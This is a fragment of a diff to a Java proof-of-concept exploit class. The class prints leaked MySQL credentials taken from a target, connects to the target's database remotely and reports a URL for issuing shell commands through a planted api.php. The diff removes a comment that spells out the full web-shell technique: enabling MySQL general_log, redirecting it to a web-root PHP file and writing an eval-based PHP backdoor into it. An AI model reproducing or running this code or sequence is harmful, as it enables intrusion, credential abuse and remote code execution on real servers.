@@ -111,6 +111,9 @@ public class Poc {
                                ",Database:" + sqlMap.get("database") +
                                ",Username:" + sqlMap.get("username") +
                                ",Password:" + sqlMap.get("password") + "\033[0m");
+            if (sqlMap.get("database") == null || sqlMap.get("username") == null ){
+                return;
+            }
             Connection connection = MySQLUtils.TestConnect(this.ip,sqlMap.get("hostport"),sqlMap.get("database"),sqlMap.get("username"),sqlMap.get("password"));
             if (connection != null)
             {
@@ -123,13 +126,6 @@ public class Poc {
                     // 执行 SQL 查询：获取 MySQL 版本
                     String sql = "SELECT VERSION();";
                     ResultSet resultSet = statement.executeQuery(sql);
-            /*
-            select @@basedir;
-            show variables like '%general%';
-            set global general_log = on;
-            set global general_log_file = 'D:/WWWSC/www/public/api.php';
-            select '<?php eval($_REQUEST["x"]);?>';
-            */
                     // 处理查询结果
                     if (resultSet.next()) {
                         version = resultSet.getString(1);
@@ -155,7 +151,7 @@ public class Poc {
                     System.out.println("\033[32;1m[+]" + "访问" + this.url + "api.php/?" + ShellCmd + "\033[0m");
                     // 关闭连接
                 }else {
-                    System.out.println("\033[32;1m[+]" + "目标数据库可远程连接!\033[0m");
+                    System.out.println("\033[34;1m[+]" + "目标数据库可远程连接!\033[0m");
                 }
                 connection.close();
             }
